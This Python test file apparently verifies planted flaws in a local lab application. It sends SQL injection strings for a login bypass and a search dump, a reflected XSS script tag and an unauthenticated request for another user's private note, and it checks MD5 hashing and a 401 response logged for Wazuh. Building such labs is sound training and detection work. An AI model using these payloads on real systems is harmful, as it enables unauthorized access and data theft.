"""
Automated verification tests for Phase 1 target application vulnerabilities.
Run against http://localhost:8080 (or inside the container).
"""
import requests
import json

BASE_URL = "http://localhost:8080"

def test_health():
    """Verify healthcheck endpoint."""
    r = requests.get(f"{BASE_URL}/health")
    assert r.status_code == 200
    data = r.json()
    assert data["status"] == "UP"
    print("[PASS] Healthcheck:", data)

def test_sqli_auth_bypass():
    """Verify SQL Injection authentication bypass."""
    payload = {"username": "admin' --", "password": "arbitrary_password"}
    r = requests.post(f"{BASE_URL}/api/login", json=payload)
    assert r.status_code == 200
    data = r.json()
    assert data["status"] == "success"
    assert data["user"]["username"] == "admin"
    print("[PASS] SQLi Auth Bypass:", data["user"])

def test_sqli_search():
    """Verify SQL Injection in search query."""
    r = requests.get(f"{BASE_URL}/api/search?q=' OR 1=1 --")
    assert r.status_code == 200
    data = r.json()
    assert data["count"] >= 3
    print(f"[PASS] SQLi Search Extracted {data['count']} records.")

def test_reflected_xss():
    """Verify Reflected XSS vulnerability."""
    xss_payload = "<script>alert('xss')</script>"
    r = requests.get(f"{BASE_URL}/api/greet", params={"name": xss_payload})
    assert r.status_code == 200
    assert xss_payload in r.text
    print("[PASS] Reflected XSS: Payload unescaped in response.")

def test_idor():
    """Verify Insecure Direct Object Reference (IDOR)."""
    # Fetch Bob's note (ID 2) without any authentication/authorization
    r = requests.get(f"{BASE_URL}/api/notes/2")
    assert r.status_code == 200
    note = r.json().get("note", {})
    assert note["user_id"] == 3  # Belongs to Bob
    assert "Payroll" in note["title"]
    print(f"[PASS] IDOR: Retrieved private note '{note['title']}' of user {note['user_id']}.")

def test_weak_crypto_hash():
    """Verify weak MD5 password hashing endpoint."""
    r = requests.post(f"{BASE_URL}/api/hash", json={"text": "admin123"})
    assert r.status_code == 200
    data = r.json()
    assert data["algorithm"] == "MD5"
    assert len(data["hash"]) == 32  # 32-char hex MD5
    print("[PASS] Weak Crypto: Generated MD5 hash", data["hash"])

def test_auth_failure_telemetry():
    """Verify authentication failure generates expected 401 response and log telemetry."""
    r = requests.post(f"{BASE_URL}/api/login", json={"username": "attacker", "password": "wrong"})
    assert r.status_code == 401
    print("[PASS] Auth Failure Telemetry: 401 correctly emitted for Wazuh.")

if __name__ == "__main__":
    print("Running Phase 1 Verification Test Suite...")
    test_health()
    test_sqli_auth_bypass()
    test_sqli_search()
    test_reflected_xss()
    test_idor()
    test_weak_crypto_hash()
    test_auth_failure_telemetry()
    print("\nALL PHASE 1 TESTS PASSED SUCCESSFULLY!")
